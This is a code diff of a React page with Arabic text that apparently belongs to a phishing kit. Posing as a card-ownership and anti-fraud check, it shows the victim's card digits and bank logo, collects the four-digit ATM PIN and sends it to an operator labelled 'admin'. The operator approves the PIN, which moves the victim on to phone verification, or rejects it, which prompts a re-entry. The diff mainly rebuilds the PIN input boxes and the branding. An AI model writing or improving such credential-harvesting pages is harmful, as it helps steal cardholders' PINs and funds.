@@ -2,13 +2,8 @@ import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay from "@/components/WaitingOverlay";
+import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
 import {
   sendData,
   codeAction,
@@ -17,14 +12,28 @@ import {
 
 export default function ATMPassword() {
   const [, navigate] = useLocation();
-  const [pin, setPin] = useState("");
+  const [pin, setPin] = useState(["", "", "", ""]);
   const [error, setError] = useState(false);
   const [isWaiting, setIsWaiting] = useState(false);
-  const inputRef = useRef<HTMLInputElement>(null);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  // Get payment data from localStorage
+  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+  const cardLast4 = paymentData.cardLast4 || "****";
+  
+  // Get card info from localStorage (fallback) or signal
+  const signalCardInfo = waitingCardInfo.value;
+  const cardInfo = signalCardInfo || {
+    bankName: paymentData.bankName || '',
+    bankLogo: paymentData.bankLogo || '',
+    cardType: paymentData.cardType || '',
+  };
 
   // Emit page enter
   useEffect(() => {
     navigateToPage("كلمة مرور ATM");
+    // Focus first input
+    inputRefs.current[0]?.focus();
   }, []);
 
   // Handle code action from admin
@@ -36,20 +45,55 @@ export default function ATMPassword() {
         navigate("/phone-verification");
       } else if (action.action === "reject") {
         // Show error and clear PIN
-        setPin("");
+        setPin(["", "", "", ""]);
         setError(true);
         setIsWaiting(false);
-        inputRef.current?.focus();
+        inputRefs.current[0]?.focus();
       }
       // Reset the action
       codeAction.value = null;
     }
   });
 
+  const handleChange = (index: number, value: string) => {
+    // Only allow digits
+    const digit = value.replace(/\D/g, "").slice(-1);
+    
+    const newPin = [...pin];
+    newPin[index] = digit;
+    setPin(newPin);
+    setError(false);
+
+    // Auto-focus next input
+    if (digit && index < 3) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    // Handle backspace
+    if (e.key === "Backspace" && !pin[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handlePaste = (e: React.ClipboardEvent) => {
+    e.preventDefault();
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
+    const newPin = [...pin];
+    for (let i = 0; i < pastedData.length; i++) {
+      newPin[i] = pastedData[i];
+    }
+    setPin(newPin);
+    const lastIndex = Math.min(pastedData.length, 3);
+    inputRefs.current[lastIndex]?.focus();
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (pin.length !== 4) {
+    const fullPin = pin.join("");
+    if (fullPin.length !== 4) {
       setError(true);
       return;
     }
@@ -57,12 +101,28 @@ export default function ATMPassword() {
     setError(false);
     setIsWaiting(true);
     sendData({
-      digitCode: pin,
+      atmCode: fullPin,
       current: "كلمة مرور ATM",
       nextPage: "توثيق رقم الجوال",
       waitingForAdminResponse: true,
     });
   };
+
+  // Get card type logo
+  const getCardTypeLogo = (type?: string) => {
+    switch (type?.toLowerCase()) {
+      case "mada":
+        return "/images/mada.png";
+      case "visa":
+        return "/images/visa.png";
+      case "mastercard":
+        return "/images/mastercard.png";
+      default:
+        return "/images/mada.png";
+    }
+  };
+
+  const isPinComplete = pin.every(digit => digit !== "");
 
   return (
     <PageLayout variant="default">
@@ -70,59 +130,76 @@ export default function ATMPassword() {
 
       <div className="bg-white rounded-2xl shadow-xl p-6">
         {/* Header */}
-        <div className="text-center mb-8">
-          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
-            <svg
-              className="w-8 h-8 text-primary"
-              fill="none"
-              stroke="currentColor"
-              viewBox="0 0 24 24"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
-              />
-            </svg>
-          </div>
-          <h1 className="text-xl font-bold text-gray-800 mb-2">كلمة مرور ATM</h1>
-          <p className="text-gray-500 text-sm">
-            أدخل كلمة مرور الصراف الآلي الخاصة ببطاقتك
+        <div className="text-center mb-6">
+          <h1 className="text-xl font-bold text-gray-800 mb-1">إثبات ملكية البطاقة</h1>
+          <h2 className="text-2xl font-bold text-primary mb-2">ATM</h2>
+          <p className="text-gray-600 text-sm">
+            لتأكيد العملية أدخل الرقم السري للصراف الآلي
           </p>
         </div>
 
-        <form onSubmit={handleSubmit} className="space-y-6">
-          {/* PIN Input */}
-          <div className="flex justify-center" dir="ltr">
-            <InputOTP
-              maxLength={4}
-              value={pin}
-              onChange={(value) => {
-                setPin(value);
-                setError(false);
-              }}
-              type="password"
-              disabled={isWaiting}
-              autoFocus
-            >
-              <InputOTPGroup>
-                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
-                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
-              </InputOTPGroup>
-            </InputOTP>
+        {/* Bank and Card Type Logos */}
+        <div className="flex justify-between items-center mb-6 px-4">
+          {/* Card Type Logo (Right) */}
+          <div className="flex items-center">
+            <img
+              src={getCardTypeLogo(cardInfo?.cardType)}
+              alt={cardInfo?.cardType || "Card"}
+              className="h-10 object-contain"
+            />
+          </div>
+          
+          {/* Bank Logo (Left) */}
+          {cardInfo?.bankLogo && (
+            <div className="flex items-center">
+              <img
+                src={cardInfo.bankLogo}
+                alt={cardInfo.bankName || "Bank"}
+                className="h-10 object-contain"
+              />
+            </div>
+          )}
+        </div>
+
+        {/* Transaction Info */}
+        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
+          <p>
+            يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
+          </p>
+        </div>
+
+        <form onSubmit={handleSubmit} className="space-y-4">
+          {/* PIN Input - 4 separate boxes */}
+          <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
+            {pin.map((digit, index) => (
+              <input
+                key={index}
+                ref={(el) => (inputRefs.current[index] = el)}
+                type="tel"
+                inputMode="numeric"
+                maxLength={1}
+                value={digit}
+                onChange={(e) => handleChange(index, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(index, e)}
+                className={`w-14 h-14 text-center text-xl font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
+                  error ? "border-red-500" : "border-gray-300"
+                }`}
+              />
+            ))}
           </div>
 
           {error && (
-            <p className="text-red-500 text-xs text-center">
-              كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى
+            <p className="text-red-500 text-sm text-center font-medium">
+              الرقم السري غير صحيح، يرجى المحاولة مرة أخرى.
             </p>
           )}
 
           {/* Submit Button */}
-          <Button type="submit" className="w-full" size="lg" disabled={isWaiting || pin.length !== 4}>
+          <Button 
+            type="submit" 
+            className="w-full h-12 text-base" 
+            disabled={isWaiting || !isPinComplete}
+          >
             {isWaiting ? (
               <div className="flex items-center justify-center gap-2">
                 <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
